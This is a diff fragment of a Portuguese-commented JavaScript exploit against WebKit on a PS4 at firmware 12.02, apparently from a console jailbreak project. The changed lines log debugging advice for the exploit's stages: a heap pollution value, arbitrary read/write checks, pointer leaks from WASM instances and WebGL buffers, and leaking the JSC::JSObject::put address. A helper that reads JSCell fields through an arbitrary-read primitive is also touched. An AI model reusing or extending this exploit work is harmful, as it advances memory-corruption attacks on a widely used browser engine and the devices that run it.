-        logS3("1. **Inspecione o heap após WASM:** Execute o exploit até a FASE 5.", "critical");
-        logS3("2. Interrompa a execução após a instância WASM ser criada. Inspecione a memória em seu endereço (wasm_instance_addr) e no offset 0x38 para o rwx_ptr.", "critical");
-        logS3("3. Verifique o conteúdo desses ponteiros e tente determinar sua natureza (ponteiro real, tag, lixo).", "critical");
-        logS3("4. Se o rwx_ptr parecer válido, tente escanear a memória ao redor dele em busca de assinaturas de funções conhecidas do WebKit (o offset do 'JSC::JSObject::put' é um bom candidato).", "critical");
-        logS3("Isso o ajudará a entender o layout do heap/WASM JIT e encontrar uma estratégia de alocação/vazamento que funcione ou confirmar a persistência do problema.", "critical");
+        logS3("A persistência da leitura de valores de poluição indica um problema de reutilização de heap ou proteções avançadas no PS4 12.02, que o Heap Feng Shui não consegue contornar.", "critical");
+        logS3("RECOMENDAÇÃO FINAL: A única forma de avançar é com depuração de baixo nível. Use um depurador (como GDB/LLDB) conectado ao processo do WebKit na PS4 para inspecionar o heap em tempo real.", "critical");
+        logS3("1. Execute o exploit até a FASE 4 (verificação L/E).", "critical");
+        logS3("2. Interrompa a execução e localize a área onde o valor de poluição (0xdeadbeef_cafebabe) foi escrito.", "critical");
+        logS3("3. Continue a execução para a FASE 5 (WASM) ou FASE 6 (WebGL).", "critical");
+        logS3("4. Após a alocação da instância WASM ou do buffer WebGL, inspecione a memória em seus endereços e em seus offsets de ponteiro (0x38 para WASM ou offsets de Structure para WebGLBuffer).", "critical");
+        logS3("5. Verifique o conteúdo desses ponteiros e determine sua natureza (ponteiro real, tag, lixo). Se for lixo, isso confirma a reutilização de heap na região crítica.", "critical");
+        logS3("Isso o ajudará a entender o layout do heap/JIT e encontrar uma estratégia de alocação/vazamento que funcione ou confirmar a persistência intransponível do problema de poluição.", "critical");
         logS3("======================================================", "critical");
     }
 
@@ -354,8 +427,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 // =======================================================================================
-// Função Auxiliar para tentar vazamento a partir de um objeto dado (não usada na estratégia WASM)
-// Mantida para referência e clareza, mas desativada na lógica de chamada principal.
+// Função Auxiliar para tentar vazamento a partir de um objeto dado (não usada nas novas estratégias, mantida para clareza)
 // =======================================================================================
 async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_func, final_result_ref, pollution_value) {
     logS3(`  Iniciando leituras da JSCell do objeto de vazamento tipo "${obj_type_name}"...`, "debug");
@@ -463,9 +535,7 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
             logS3(`    ALERTA DE POLUIÇÃO: JSC::JSObject::put está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("JSC::JSObject::put poluído.");
         }
-        if (!isAdvancedInt64Object(js_object_put_func_addr) || js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) {
-             throw new Error("Falha ao vazar ponteiro para JSC::JSObject::put (endereço é 0x0).");
-        }
+        if (!isAdvancedInt64Object(js_object_put_func_addr) || js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) throw new Error("Falha ao vazar ponteiro para JSC::JSObject::put (endereço é 0x0).");
         if (js_object_put_func_addr.high() === 0x7ff80000 && js_object_put_func_addr.low() === 0) {
             throw new Error("Ponteiro para JSC::JSObject::put é NaN (provável erro de reinterpretação ou JIT).");
         }
